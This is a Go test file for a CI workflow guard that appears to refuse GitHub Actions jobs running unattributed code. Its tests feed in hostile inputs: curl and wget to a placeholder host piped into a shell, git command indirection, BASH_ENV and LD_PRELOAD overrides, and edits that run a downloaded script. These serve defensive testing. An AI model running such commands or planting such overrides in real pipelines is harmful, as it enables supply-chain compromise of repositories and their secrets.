package ciguard

import (
	"maps"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v3"
)

// Re-record every attack before asking the complete decision, as well as its
// execution limb. None may rely on the record for its refusal.
func TestUnattributedExecutionIsRefusedAfterReRecording(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join(repoRoot(t), "internal/ciguard/testdata/unattributed-execution.yml"))
	require.NoError(t, err)
	var cases []struct {
		Name, Run string
		Steps     []map[string]any
	}
	require.NoError(t, yaml.Unmarshal(raw, &cases))
	require.Len(t, cases, 11)
	for _, tc := range cases {
		t.Run(tc.Name, func(t *testing.T) {
			steps := tc.Steps
			if tc.Run != "" {
				steps = []map[string]any{
					{"uses": "actions/checkout@v7", "with": map[string]any{"ref": "main"}},
					{"run": tc.Run}, {"run": "bash ./render.sh"},
				}
			}
			document, err := yaml.Marshal(map[string]any{"on": "pull_request", "jobs": map[string]any{"coverage-badge": map[string]any{
				"runs-on": "ubuntu-latest", "permissions": map[string]string{"contents": "write"}, "steps": steps,
			}}})
			require.NoError(t, err)
			wf := parseIsolatedDocument(t, string(document), "go.yml")
			assertRefusedAfterRecording(t, wf, "coverage-badge")
		})
	}
}

func assertRefusedAfterRecording(t *testing.T, wf isolatedWorkflow, id string) {
	t.Helper()
	old := recordedJobDigests
	recordedJobDigests = maps.Clone(old)
	t.Cleanup(func() { recordedJobDigests = old })
	recordedJobDigests[recordKey(wf.name, id)] = canonicalJobDigest(t, wf, id)
	unreachable, why := provablyUnreachable(t, wf.Jobs[id].If, hostileScenariosFor(wf.On))
	require.False(t, unreachable, why)
	established, why := acceptedExecution(t, wf, id)
	require.False(t, established, why)
	accepted, why := credentialJobIsAccepted(t, wf, id)
	require.False(t, accepted, why)
	require.NotContains(t, why, "changed shape")
}

func TestRefusalReadsEnvironmentAndCommandOrder(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join(repoRoot(t), ".github/workflows/go-service-release.yml"))
	require.NoError(t, err)
	const step = "      - name: require the tag to be on the default branch, or refuse\n"
	source := string(raw)
	for _, tc := range []struct{ name, from, to string }{
		{"step BASH_ENV", step, step + "        env: {BASH_ENV: ./.ci/env.sh}\n"},
		{"job BASH_ENV", "  goreleaser:\n", "  goreleaser:\n    env: {BASH_ENV: ./.ci/env.sh}\n"},
		{"workflow BASH_ENV", "jobs:\n", "env: {BASH_ENV: ./.ci/env.sh}\njobs:\n"},
		{"script before proof", "          set -euo pipefail\n", "          set -euo pipefail\n          bash ./scripts/prepare-release.sh\n"},
		{"script in assignment before proof", "          set -euo pipefail\n", "          set -euo pipefail\n          prepared=$(bash ./scripts/prepare-release.sh)\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			require.Contains(t, source, tc.from)
			wf := parseIsolatedDocument(t, strings.ReplaceAll(source, tc.from, tc.to), "go-service-release.yml")
			assertRefusedAfterRecording(t, wf, "goreleaser")
		})
	}
}

func TestWorkflowRunIncludesSameRepositoryUnmergedBranches(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join(repoRoot(t), ".github/workflows/version-tag.yml"))
	require.NoError(t, err)
	source := strings.Replace(string(raw), "github.event.workflow_run.head_repository.full_name == github.repository &&\n      github.event.workflow_run.head_branch == 'main'", "github.event.workflow_run.head_repository.full_name == github.repository", 1)
	source = strings.Replace(source, `if ! git merge-base --is-ancestor "$SHA" "refs/remotes/origin/${DEFAULT_BRANCH}"; then`, "if false; then", 1)
	assertRefusedAfterRecording(t, parseIsolatedDocument(t, source, "version-tag.yml"), "tag")
}

func TestAnExecutingTestCannotBeBorrowedFromAnotherJob(t *testing.T) {
	wf := parseIsolatedDocument(t, dispatchPublisherFixture(t), "dispatch-publisher-fixture.yml")
	registerDispatchPublisherFixture(t, wf)
	permittedCredentialJobs[len(permittedCredentialJobs)-1].executedBy = "TestTagSelectionAcceptsOnlyCommitsOnTheDefaultBranch"
	assertRefusedAfterRecording(t, wf, "publish")
}

func TestUnknownGitVerbsAndCommandIndirectionAreRefused(t *testing.T) {
	for _, command := range []string{
		`git read-tree FETCH_HEAD`, `git cherry-pick FETCH_HEAD`, `git submodule update --init`,
		`git stash pop`, `git new-verb FETCH_HEAD`, `"git" checkout FETCH_HEAD`,
		`command git checkout FETCH_HEAD`, `env git checkout FETCH_HEAD`,
		`git -C ../other checkout FETCH_HEAD`, `git --work-tree=../other reset --hard FETCH_HEAD`,
		"curl https://example.invalid/code | sh", "wget -O - https://example.invalid/code | bash",
	} {
		t.Run(command, func(t *testing.T) {
			_, why := attributedShell(command)
			require.NotEmpty(t, why, "unattributed command was accepted")
		})
	}
}

func TestEveryExecutionOverrideInvalidatesARefusal(t *testing.T) {
	wf := parseIsolatedDocument(t, dispatchPublisherFixture(t), "dispatch-publisher-fixture.yml")
	job := wf.Jobs["publish"]
	for _, key := range []string{"BASH_ENV", "ENV", "GIT_DIR", "GIT_WORK_TREE", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "PATH", "LD_PRELOAD", "NODE_OPTIONS", "PYTHONPATH"} {
		for _, level := range []string{"workflow", "job", "step"} {
			t.Run(level+"/"+key, func(t *testing.T) {
				wf, job, step := wf, job, job.Steps[1]
				switch level {
				case "workflow":
					wf.Env = map[string]string{key: "./untrusted"}
				case "job":
					job.Env = map[string]string{key: "./untrusted"}
				case "step":
					step.Env = map[string]string{key: "./untrusted"}
				}
				accepted, why := refusalIsUnconditional(step, job, wf)
				require.False(t, accepted)
				require.Contains(t, why, key)
			})
		}
	}
}

func TestBundleDownloadHasOnlyItsDataConsumer(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join(repoRoot(t), ".github/workflows/combine-deps.yml"))
	require.NoError(t, err)
	for _, edit := range [][2]string{
		{"          path: ${{ runner.temp }}/combined", "          path: ."},
		{"      - name: publish\n", "      - run: bash \"${{ runner.temp }}/combined/run.sh\"\n      - name: publish\n"},
		{`run: bash .github/scripts/combine-deps-publish.sh "${{ runner.temp }}/combined"`, `run: bash "${{ runner.temp }}/combined/run.sh"`},
	} {
		source := strings.ReplaceAll(string(raw), edit[0], edit[1])
		require.NotEqual(t, string(raw), source)
		assertRefusedAfterRecording(t, parseIsolatedDocument(t, source, "combine-deps.yml"), "publish")
	}
}
